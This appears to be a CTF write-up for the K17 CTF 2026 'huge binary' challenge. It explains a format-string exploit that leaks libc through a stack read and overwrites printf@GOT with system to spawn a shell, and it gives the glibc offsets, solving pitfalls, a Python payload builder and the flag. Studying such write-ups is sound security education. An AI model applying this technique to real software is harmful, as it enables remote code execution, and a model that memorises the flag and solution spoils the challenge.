# K17 CTF 2026 — huge binary (fmtstr GOT overwrite → system)

## Challenge
- `nc chal.secso.cc 4002`, easy (100 pts)
- Binary: No RELRO, No canary, NX, No PIE. Two format strings + arbitrary stack read.
- Flag: `K17{it's_ab0v3_aver@ge_actua1ly}`

## Technique: Format-string GOT overwrite with null-byte addresses

### The bug chain
1. `scanf("%d", &index)` then `mov -0x8(%rbp,%rax,8), %rax` → arbitrary stack read. `index=2` reads `[rbp+8]` = main's return address in libc → libc base.
2. Two `printf(buf)` calls with user-controlled format strings → arbitrary write via `%hhn`.
3. Overwrite `printf@GOT` (0x403390, No RELRO) with `system`; second `printf(buf2)` becomes `system("/bin/sh")`.

### Gotchas (all hit during solve)
1. **Which libc does the binary ACTUALLY load?** `ldd` the binary. Locally it used the container's glibc 2.35; remotely the provided libc_huge.so.6 (glibc 2.41). Offsets differ:
   - glibc 2.35: system=0x50d70, printf=0x606f0, ret_off=0x29d90 (`__libc_start_main+0xb0`)
   - glibc 2.41: system=0x53110, printf=0x59900, ret_off=0x29ca8 (`__libc_start_call_main+0x78`)
2. **ELF base ≠ r-xp segment start.** libc symbols are relative to the first LOAD segment (r--p), 0x28000 below the r-xp segment. Measure ret offset against the ELF base (first mapping in /proc/maps).
3. **printf stops at null bytes.** GOT addresses like 0x403390 contain `\x00` → truncate the format string. Fix: put the addresses at the END of the payload. They're still on the stack at known positions (referenced via `%N$hhn`), and printed only after the writes complete.
4. **Carry across bytes.** printf and system differ in the low 16 bits by an amount that borrows/carries into byte2 (e.g. printf=base+0x606f0, system=base+0x50d70 → byte2 differs by 1). Write 3 bytes: `b0=system&0xFF`, `b1=(system>>8)&0xFF`, `b2=(system>>16)&0xFF` (b2 varies with ASLR, computed from leak).
5. **Sort %hhn writes by ascending byte value** so the count accumulates monotonically; verify the position check matches the sorted address order.
6. **fmtstr position of buf1**: stack args start at rsp=rbp-0x120; buf1 at rbp-0x90 → position 24. Addresses appended at the end land at 27-29 (verify empirically with `%N$p` leaks).
7. **Red herring**: a "fmtmsg init → __strtol(NULL)" crash was caused by applying glibc 2.41's system offset to a glibc 2.35 base — the GOT pointed into an unrelated function. Always sanity-check `libc_base` is page-aligned after computing it.

### Payload template
```python
def build_payload(addr, b0, b1, b2, base_pos=24):
    writes = [(b0, addr), (b1, addr+1), (b2, addr+2)]
    writes.sort()
    for p0 in range(24, 44):
        for p1 in range(24, 44):
            for p2 in range(24, 44):
                if len({p0,p1,p2}) != 3: continue
                pos = {addr: p0, addr+1: p1, addr+2: p2}
                fmt = b''; prev = 0
                for val, a in writes:
                    fmt += f'%{val-prev}c%{pos[a]}$hhn'.encode(); prev = val
                pad = (8 - len(fmt) % 8) % 8
                total = fmt + b'A'*pad
                for _, a in writes: total += p64(a)
                actual = {a: base_pos + (len(fmt)+pad)//8 + i for i, (_, a) in enumerate(writes)}
                if all(actual[a] == pos[a] for a in (addr, addr+1, addr+2)):
                    return total
```

## Authoring notes
- The "huge binary" name is a joke (the binary is tiny). The challenge is a clean intro to fmtstr GOT overwrite: leak via index read, write via %hhn, trigger via second printf.
- No RELRO + No PIE makes the GOT overwrite trivial once the fmtstr mechanics are right.